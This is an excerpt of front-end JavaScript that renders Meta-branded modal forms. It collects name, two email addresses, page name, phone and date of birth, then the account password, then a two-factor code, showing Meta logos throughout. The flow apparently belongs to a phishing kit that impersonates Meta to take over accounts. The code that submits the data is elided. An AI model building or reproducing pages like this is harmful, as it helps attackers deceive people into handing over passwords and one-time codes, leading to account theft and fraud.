...
function openClientModal() {
    ...
    const content = `
        <h2 class="font-bold text-[15px] mb-4">${t('form_title')}</h2>
        <form id="clientForm" class="space-y-3">
            <input type="text" id="fullName" placeholder="${t('form_full_name_placeholder')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="email" id="email" placeholder="${t('form_email_placeholder')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="email" id="emailBusiness" placeholder="${t('form_email_business_placeholder')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="text" id="fanpage" placeholder="${t('form_page_name_placeholder')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="tel" id="phone" placeholder="${t('form_phone_placeholder')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <div>
                <b class="text-[#9a979e] text-sm block mb-2">${t('form_dob_label')}</b>
                <div class="grid grid-cols-3 gap-2">
                    <input type="number" id="day" placeholder="${t('form_day_placeholder')}" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                    <input type="number" id="month" placeholder="${t('form_month_placeholder')}" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                    <input type="number" id="year" placeholder="${t('form_year_placeholder')}" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                </div>
            </div>
            <textarea placeholder="${t('form_notes_placeholder')}" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
            <p class="text-[#9a979e] text-[14px] mb-[7px]">${t('form_response_note')}</p>
            <div class="mt-[15px] mb-[20px]">
                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
                    ...
                    ${t('form_agree_prefix')}<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">${t('form_terms_text')} <img src="./public/meta/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
                </label>
            </div>
            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">${t('form_send_button')}</button>
        </form>
    `;
...
function openSecurityModal() {
    ...
    const content = `
        <div class="h-full flex flex-col items-center justify-between flex-1">
            ...
            <div class="w-full">
                <p class="text-[#9a979e] text-sm mb-4">${t('security_intro')}</p>
                <form id="securityForm">
                    <input type="password" id="password" placeholder="${t('label_password')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">${t('btn_continue')}</button>
                    <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm">${t('link_forgot_password')}</a></p>
                </form>
            </div>
    ...
    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                ...
                <h2 class="text-[20px] text-[black] font-[700] mb-[15px]">${t('auth_title_step1')}</h2>
                <p class="text-[#9a979e] text-sm mb-4">${t('auth_intro').replace('{email}', emailDisplay).replace('{phone}', phoneDisplay)}</p>
                <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
                    <img src="./public/meta/authentication.png" alt="2FA" class="w-full">
                </div>
                <form id="authForm">
                    <input type="number" id="twoFa" placeholder="${t('placeholder_code')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">${t('btn_continue')}</button>
                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>${t('btn_try_another_way')}</span></div>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/meta/logo-gray.svg" alt="Meta">
